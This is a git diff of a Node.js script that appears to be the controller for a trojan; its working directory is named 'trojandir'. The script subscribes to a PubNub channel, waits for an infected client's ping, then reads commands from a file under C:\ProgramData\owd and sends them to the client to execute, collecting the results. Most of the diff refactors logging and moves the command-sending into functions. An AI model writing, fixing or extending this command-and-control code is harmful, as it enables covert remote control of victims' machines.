@@ -5,22 +5,88 @@ import PubNub from "pubnub";
 import fs from "fs";
 import crypto from "crypto";
 
-
-function logmsg(msg) {
-    console.log(msg);
-}
-
-
-function isNullOrWhitespace(str) {
-    return !str || !str.trim();
-}
-
 function getRandomCode(n) {
     const min = Math.pow(10, n - 1);
     const max = Math.pow(10, n) - 1;
 
-    return crypto.randomInt(min, max + 1).toString();    
+    return crypto.randomInt(min, max + 1).toString();
 }
+
+function isNullOrWhitespace(str) {
+    if (typeof str === "undefined") {
+        return true;
+    }
+
+    if (!(typeof str === "string")) return false;
+
+    return !str || !str.trim();
+}
+
+function getCallerName() {
+    const originalFunc = Error.prepareStackTrace;
+
+    try {
+        Error.prepareStackTrace = (err, stack) => stack;
+
+        const err = new Error();
+        const currentStack = err.stack;
+
+        if (currentStack && currentStack[2]) {
+            return currentStack[2].getFunctionName() || "SYSTEM";
+        }
+    } catch (e) {
+    } finally {
+        Error.prepareStackTrace = originalFunc;
+    }
+
+    return "unknown";
+}
+
+function logmsg(msgstr) {
+    let callername = getCallerName();
+    let msgout =
+        "|" +
+        String(path.basename(process.argv[1])) +
+        "|" +
+        String(process.pid) +
+        "|" +
+        callername;
+
+    if (msgstr instanceof Error) {
+        msgout += "|" + util.inspect(msgstr);
+    } else if (typeof msgstr === "string") {
+        msgout += "|" + msgstr;
+    }
+
+    console.log(msgout);
+
+    if (logfpath)
+        fs.appendFileSync(logfpath, msgout + "\r\n", "utf8");
+}
+
+function getTimestamp() {
+    const date = new Date();
+
+    // Extract components
+    const year = date.getFullYear();
+    const month = String(date.getMonth() + 1).padStart(2, "0"); //
+    const day = String(date.getDate()).padStart(2, "0"); //
+    const hours = String(date.getHours()).padStart(2, "0"); //
+    const minutes = String(date.getMinutes()).padStart(2, "0"); //
+    const seconds = String(date.getSeconds()).padStart(2, "0"); //
+    const ms = String(date.getMilliseconds()).padStart(3, "0"); //
+
+    // Combine into final strings
+    const yyyymmddhhmmss = `${year}${month}${day}${hours}${minutes}${seconds}`;
+    const fullWithMs = `${yyyymmddhhmmss}${ms}`;
+
+    return fullWithMs;
+}
+
+let scriptname = path.basename(process.argv[1]);
+let scriptdirpath = path.dirname(process.argv[1]);
+
+var logfpath = path.join(scriptdirpath, scriptname + '_'+ getTimestamp() +'.log');
 
 const enginename = 'JS'; // 'BAT'
 const trojandir = 'C:\\ProgramData\\owd\\';
@@ -45,14 +111,26 @@ const channel = pubnub.channel(client_channel);
 const subscription = channel.subscription();
 
 var seqid = 1;
-var cmdresponse = null;
-
 var cmdresponses = [];
+var clientconnected = false;
+var cmdssent = false;
+var cmds = [];
 
 // BUG -- not able to receive any messages from client
 subscription.onMessage = (messageEvent) => {
-    cmdresponse = messageEvent.message.execresult;
+    let message = messageEvent?.message;
+    let cmdresponse = messageEvent.message.execresult;
     cmdresponses.push(cmdresponse);
+
+    if ( Object.hasOwn(message, 'ping') ) {
+        clientconnected = true;
+    }
+
+    if ( ( clientconnected ) && ( ! cmdssent ) ) {
+        cmds = readcmds();
+        let ret = sendcmds(cmds);
+        cmdssent = true;
+    }
 
     let messagelog = '';
 
@@ -65,25 +143,6 @@ subscription.onMessage = (messageEvent) => {
 
 subscription.subscribe();
 
-
-function getTimestamp() {
-    const date = new Date();
-    
-    // Extract components
-    const year = date.getFullYear();
-    const month = String(date.getMonth() + 1).padStart(2, '0'); //
-    const day = String(date.getDate()).padStart(2, '0');       //
-    const hours = String(date.getHours()).padStart(2, '0');    //
-    const minutes = String(date.getMinutes()).padStart(2, '0');//
-    const seconds = String(date.getSeconds()).padStart(2, '0');//
-    const ms = String(date.getMilliseconds()).padStart(3, '0'); //
-  
-    // Combine into final strings
-    const yyyymmddhhmmss = `${year}${month}${day}${hours}${minutes}${seconds}`;
-    const fullWithMs = `${yyyymmddhhmmss}${ms}`;
-  
-    return fullWithMs;
-}
 
 async function sendCmd(cmdtext) {
     
@@ -129,32 +188,37 @@ const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
 function sleepSync(ms) {
     const buffer = new SharedArrayBuffer(4);
     const view = new Int32Array(buffer);
+
+    logmsg(`waiting ${ms} milli seconds...`);
+
+
     // Atomics.wait freezes the execution thread until the condition is met or 
     // it times out
     Atomics.wait(view, 0, 0, ms); 
 }
 
-let lines = [];
+function readcmds() {
+    let lines = [];
+    const content = fs.readFileSync('C:\\ProgramData\\owd\\nodehostrelay.cmdslist.js', 'utf-8'); // utf16le, utf-8
+    const linesArray = content.split(/\r?\n/);
+    lines = linesArray.filter(str => str !== "");
 
-// put some basic text at beginning of file to ensure read works
-const content = fs.readFileSync('C:\\ProgramData\\owd\\nodehostrelay.cmdslist.js', 'utf-8'); // utf16le, utf-8
-const linesArray = content.split(/\r?\n/);
-lines = linesArray.filter(str => str !== "");
-;
+    var cmds = [];
+    cmds.push("new Date().toLocaleString();");
+    cmds.push(...lines);
 
-var cmds = [];
-cmds.push("new Date().toLocaleString();");
-cmds.push(...lines);
+    return cmds;
+}
 
+async function sendcmds(cmds) {
+    for ( let i = 0; i<cmds.length; i++) {
+        let cmdtext = cmds[i];
+            
+        let ret = await sendCmd(cmdtext);
 
-for ( let i = 0; i<cmds.length; i++) {
-    let cmdtext = cmds[i];
-        
-    let ret = await sendCmd(cmdtext);
-
-    logmsg('waiting 1 second...');
-    sleepSync(1000);    
-} 
+        // sleepSync(1000);
+    } 
+}
 
 process.on('SIGINT', () => {
   logmsg('\nUnsubscribing and exiting...');
